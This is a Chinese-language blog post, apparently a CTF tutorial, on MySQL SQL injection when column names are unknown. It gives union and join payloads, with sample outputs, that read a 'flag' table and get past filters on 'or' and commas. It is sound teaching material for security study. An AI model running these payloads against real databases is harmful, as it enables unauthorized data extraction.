<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> SQL注入之无列名注入 · Imtinmin的小站</title><meta name="description" content="SQL注入之无列名注入 - Imtinmin"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.ico?v=2018"><link rel="stylesheet" href="/css/style.css"><link rel="search" type="application/opensearchdescription+xml" href="http://imtinmin.github.io/atom.xml" title="Imtinmin的小站"><meta name="generator" content="Hexo 4.0.0"></head><body><div class="wrap"><header><h1 class="title">Imtinmin的小站</h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link" href="/archives/" target="_self">ARCHIVE</a></li><li class="nav-list-item"><a class="nav-list-link" href="/about" target="_self">ABOUT</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">SQL注入之无列名注入</h1><div class="post-info">2019-11-04</div><div class="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当sql过滤了<code>or</code>时，无法从<code>information_schema</code>数据库查出列名。但是存在<code>innodb_index_stats</code>、<code>innodb_index_table</code>两张表（mysql版本大于5.6.3），可以查询出表名，再进行无列名注入</p>
<p><a href="https://dev.mysql.com/doc/relnotes/mysql/5.6/en/news-5-6-3.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/relnotes/mysql/5.6/en/news-5-6-3.html</a></p>
<p><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/mysql/mysql5.6.3.png" alt="img"></p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>题目语句为 select * from test where id=x</p>
<p>当前数据库有两张表</p>
<p><code>flllllag</code></p>
<table>
<thead>
<tr>
<th align="left">id</th>
<th align="left">flag</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">flag{3690c6f6-fe49-11e9-bf58-005056c00001}</td>
</tr>
</tbody></table>
<p><code>test</code></p>
<table>
<thead>
<tr>
<th align="left">id</th>
<th align="left">title</th>
<th align="left">content</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">hello</td>
<td align="left">tinmin</td>
</tr>
</tbody></table>
<p>flllllag表有两列，</p>
<p>有:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2 union select * from flllllag;</span><br><span class="line">mysql&gt; select * from (select 1,2 union select * from flllllag)a;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>select 1,2 union select * from flllllag</p>
</blockquote>
<blockquote>
<table>
<thead>
<tr>
<th align="left">1</th>
<th align="left">2</th>
</tr>
</thead>
<tbody><tr>
<td align="left">2</td>
<td align="left">flag{3690c6f6-fe49-11e9-bf58-005056c00001}</td>
</tr>
</tbody></table>
</blockquote>
<p>test表 三列</p>
<p>union select 要保持列一样</p>
<ul>
<li>select 1,<code>`2`</code>,3 from (select 1,2 union select * from flllllag)</li>
</ul>
<p><code>`2`</code> 指取from结果的第二列</p>
<table>
<thead>
<tr>
<th align="left">1</th>
<th align="left">2</th>
<th align="left">3</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">2</td>
<td align="left">3</td>
</tr>
<tr>
<td align="left">1</td>
<td align="left">flag{3690c6f6-fe49-11e9-bf58-005056c00001}</td>
<td align="left">3</td>
</tr>
</tbody></table>
<blockquote>
<p>select * from test union select 1,<code>`2`</code>,3 from (select 1,2 union select * from flllllag)a;</p>
</blockquote>
<p>结果就是：</p>
<table>
<thead>
<tr>
<th align="left">id</th>
<th align="left">title</th>
<th align="left">content</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">hello</td>
<td align="left">tinmin</td>
</tr>
<tr>
<td align="left">1</td>
<td align="left">2</td>
<td align="left">3</td>
</tr>
<tr>
<td align="left">1</td>
<td align="left">flag{3690c6f6-fe49-11e9-bf58-005056c00001}</td>
<td align="left">3</td>
</tr>
</tbody></table>
<h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3><p>回顾过滤逗号的语句</p>
<blockquote>
<p>select * from test union select 1,2,3</p>
</blockquote>
<p>等同于</p>
<p>select * from test union select * from (select 1)a join (select 2)b join (select 3)c</p>
<p>回到语句</p>
<blockquote>
<p>select * from test union select 1,<code>2</code>,3 from (select 1,2 union select * from flllllag)a;</p>
</blockquote>
<ul>
<li>select * from test union select * from (select 1)a join (select 2)b join(select <code>2</code> from (select 1,2 union select * from flllllag)i)k;</li>
</ul>
<blockquote>
<p>`    叫  backticks</p>
</blockquote>
<p>平时sql语句喜欢用： </p>
<blockquote>
<p>select id from user</p>
</blockquote>
<p>规范写法： </p>
<blockquote>
<p>select <code>`id`</code> from user</p>
</blockquote>
<p>同样为查询id列</p>
<p><code>2</code>是查询表头为2的列</p>
<p>还可以</p>
<p>选取列查</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select 1,2)a</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">1</th>
<th align="left">2</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">2</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select a.1 from (select 1,2)a</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">1</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select a.2 from (select 1,2)a</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">2</th>
</tr>
</thead>
<tbody><tr>
<td align="left">2</td>
</tr>
</tbody></table>
<p>保证join一列</p>
<ul>
<li>select * from test union select * from (select 1)a join (select 2)b join(select i.2 from (select 1,2 union select * from flllllag)i)k;</li>
</ul>
</div></article></div></main><footer><div class="paginator"><a class="prev" href="/2019/11/05/2019-11-5-CTF/">PREV</a><a class="next" href="/2019/08/21/2019-8-21-CTF/">NEXT</a></div><div class="copyright"><p>© 2019 PEACE & LOVE</p><p>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>, <a href="https://github.com/jeremyfan/hexo-theme-still" target="_blank">theme</a> by <a href="https://github.com/jeremyfan" target="_blank">Imtinmin</a>.</p></div></footer></div></body></html>